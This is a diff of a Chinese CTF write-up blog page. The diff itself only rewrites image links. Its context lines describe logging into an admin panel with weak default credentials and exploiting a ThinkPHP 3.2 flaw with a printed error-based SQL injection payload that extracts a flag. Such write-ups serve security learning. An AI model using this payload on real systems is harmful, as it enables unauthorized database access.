@@ -198,8 +198,7 @@ Disallow: /xhtml/?
 Disallow: /center
 </code></pre><p>访问<code>admin</code>，使用<code>admin/12345678</code>成功登录，登录后有一个搜索功能</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009845.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009845.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009845.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009845.jpg loading=lazy>
 </a>
 </figure></p>
 <p>结合页面<code>thinkphp 3.2</code>的框架漏洞，使用以下 payload 逐渐获得 flag</p>
@@ -222,23 +221,19 @@ Disallow: /center
 </span><span class=w>
 </span><span class=w></span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>from</span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>),</span><span class=n>concat</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7</span><span class=p>,</span><span class=n>flag</span><span class=p>,</span><span class=mi>0</span><span class=n>x7e</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>flag</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=n>floor</span><span class=p>(</span><span class=n>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span><span class=n>x</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=n>a</span><span class=w>
 </span></code></pre></div><p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003705.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003705.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003705.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003705.jpg loading=lazy>
 </a>
 </figure></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002276.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002276.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002276.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002276.jpg loading=lazy>
 </a>
 </figure></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004079.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004079.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004079.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004079.jpg loading=lazy>
 </a>
 </figure></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009741.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009741.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009741.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009741.jpg loading=lazy>
 </a>
 </figure></p>
 <p>结果发现提交不对，然后看了其他师傅的 wp 发现少了一位，然后搜了一下相关资料，应该是限制了输出</p>
